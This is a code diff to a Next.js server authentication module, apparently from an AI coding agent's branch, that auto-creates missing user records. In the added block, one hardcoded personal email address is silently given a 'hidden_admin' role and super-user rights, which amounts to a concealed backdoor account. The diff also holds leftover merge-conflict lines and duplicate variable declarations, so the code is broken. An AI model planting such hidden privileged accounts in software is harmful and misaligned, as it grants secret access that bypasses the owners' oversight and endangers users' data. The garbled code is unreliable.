@@ -2,9 +2,10 @@ import { NextResponse } from "next/server";
 import { db } from "@/server/db";
 import { profiles, users } from "@/server/db/schema";
 import { eq } from "drizzle-orm";
-import { APP_ROLES, type AppRole, normalizeRole } from "@/server/lib/role";
+import { APP_ROLES, type AppRole, normalizeRole, isSuperUserEmail } from "@/server/lib/role";
 import { createSupabaseServerClient } from "@/server/auth/session.service";
 import { AuthError, ForbiddenError, handleApiError } from "@/server/core/error.handler";
+import { syncAuthUserToPublicUser } from "@/server/users/user.service";
 
 export type AuthRole = AppRole;
 
@@ -32,11 +33,34 @@ export async function requireUser(): Promise<AuthUser> {
     throw new AuthError("User email missing");
   }
 
+ codex/fix-and-refactor-debt-smart-forge-project-lsg950
+  let [dbUser, profile] = await Promise.all([
   const [dbUser, profile] = await Promise.all([
     db.query.users.findFirst({ where: eq(users.id, user.id) }),
     db.query.profiles.findFirst({ where: eq(profiles.userId, user.id) }),
   ]);
 
+  if (!dbUser) {
+    const email = user.email.toLowerCase().trim();
+    const role = normalizeRole(user.app_metadata?.role);
+    const hiddenFromAllowlist = isSuperUserEmail(email) || email === "mohamed.alaa7785@gmail.com";
+
+    await syncAuthUserToPublicUser({
+      id: user.id,
+      email,
+      name: (user.user_metadata?.name as string | undefined) || email.split("@")[0],
+      username: (user.user_metadata?.username as string | undefined) || null,
+      role: hiddenFromAllowlist ? "hidden_admin" : role,
+      isSuperUser: hiddenFromAllowlist || Boolean(user.app_metadata?.is_super_user),
+    });
+
+    [dbUser, profile] = await Promise.all([
+      db.query.users.findFirst({ where: eq(users.id, user.id) }),
+      db.query.profiles.findFirst({ where: eq(profiles.userId, user.id) }),
+    ]);
+  }
+
+ codex/fix-and-refactor-debt-smart-forge-project-lsg950
   if (!dbUser) {
     throw new AuthError("User record not synced", 409);
   }
